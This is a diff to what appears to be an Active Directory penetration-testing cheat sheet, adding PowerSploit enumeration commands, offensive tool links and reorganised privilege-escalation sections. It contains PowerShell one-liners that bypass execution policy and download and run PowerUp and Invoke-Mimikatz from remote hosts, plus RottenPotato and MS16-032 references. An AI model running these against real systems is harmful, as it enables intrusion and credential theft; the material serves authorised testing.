@@ -33,6 +33,12 @@
     List all GPO for a domain :
     Get-GPO -domaine DOMAIN.COM -all
     Get-GPOReport -all -reporttype xml --all
+
+    or
+
+    Powersploit:
+    Get-NetGPO
+    Get-NetGPOGroup
     ```
   * Dangerous Built-in Groups Usage
 
@@ -99,22 +105,21 @@
 
 ## Tools
   * [Impacket](https://github.com/CoreSecurity/impacket)
-  * Responder
-  * Mimikatz
+  * [Responder](https://github.com/SpiderLabs/Responder)
+  * [Mimikatz](https://github.com/gentilkiwi/mimikatz)
   * [Ranger](https://github.com/funkandwagnalls/ranger)
-  * BloodHound
-  * RottenPotato
+  * [BloodHound](https://github.com/BloodHoundAD/BloodHound)
   * [AdExplorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer)
+  * [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
+  * [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
+  ```
+  powershell.exe -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString('http://10.11.0.47/PowerUp.ps1'); Invoke-AllChecks”
+  powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/Invoke-Mimikatz.ps1');"
+  ```
 
-## PowerSploit
-```
-https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
-powershell.exe -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString('http://10.11.0.47/PowerUp.ps1'); Invoke-AllChecks”
-powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/Invoke-Mimikatz.ps1');"
-```
 
-
-## PrivEsc - Token Impersonation (RottenPotato)
+## Privilege Escalation
+### PrivEsc - Token Impersonation (RottenPotato)
 Binary available at : https://github.com/foxglovesec/RottenPotato      
 Binary available at : https://github.com/breenmachine/RottenPotatoNG   
 ```c
@@ -134,7 +139,7 @@ Get-Process wininit | Invoke-TokenManipulation -CreateProcess "Powershell.exe -n
 ```
 
 
-## PrivEsc - MS16-032 - Microsoft Windows 7 < 10 / 2008 < 2012 R2 (x86/x64)
+### PrivEsc - MS16-032 - Microsoft Windows 7 < 10 / 2008 < 2012 R2 (x86/x64)
 ```
 Powershell:
 https://www.exploit-db.com/exploits/39719/
